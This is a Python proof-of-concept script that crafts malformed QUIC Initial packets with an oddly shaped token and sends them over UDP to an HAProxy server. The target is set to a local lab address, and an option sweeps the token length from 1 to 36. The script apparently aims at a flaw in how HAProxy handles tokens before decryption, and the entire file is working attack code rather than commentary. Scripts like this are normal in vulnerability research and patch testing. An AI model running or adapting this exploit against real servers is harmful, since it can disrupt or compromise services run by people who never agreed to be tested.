#!/usr/bin/env python3
"""Send a malformed QUIC Initial token to a local HAProxy lab target."""

import argparse
import os
import socket
import struct


LAB_HOST = "127.0.0.1"


def build_packet(token_length: int) -> bytes:
    if not 1 <= token_length <= 63:
        raise ValueError("token length must fit a one-byte QUIC varint")

    dcid = os.urandom(8)
    scid = os.urandom(8)
    token = bytes([0xB7]) + bytes(token_length - 1)

    packet = bytearray()
    packet.append(0xC0)  # Long header, fixed bit, Initial, one-byte packet number.
    packet.extend(struct.pack("!I", 1))
    packet.append(len(dcid))
    packet.extend(dcid)
    packet.append(len(scid))
    packet.extend(scid)
    packet.append(token_length)
    packet.extend(token)
    packet.append(17)  # One-byte packet number plus the minimum AEAD tag size.
    packet.extend(bytes(17))  # Token validation happens before payload decryption.
    packet.extend(bytes(1200 - len(packet)))
    return bytes(packet)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=18443)
    parser.add_argument("--token-length", type=int, default=1)
    parser.add_argument("--sweep", action="store_true", help="send token lengths 1 through 36")
    parser.add_argument("--receive", action="store_true", help="wait briefly for a server response")
    args = parser.parse_args()

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(1.0)
        lengths = range(1, 37) if args.sweep else [args.token_length]
        for token_length in lengths:
            packet = build_packet(token_length)
            sock.sendto(packet, (LAB_HOST, args.port))
            print(f"sent {len(packet)} bytes with NEW_TOKEN length {token_length}")
            if args.receive:
                try:
                    response, peer = sock.recvfrom(65535)
                    print(f"received {len(response)} bytes from {peer}")
                except socket.timeout:
                    print("no response received")


if __name__ == "__main__":
    main()
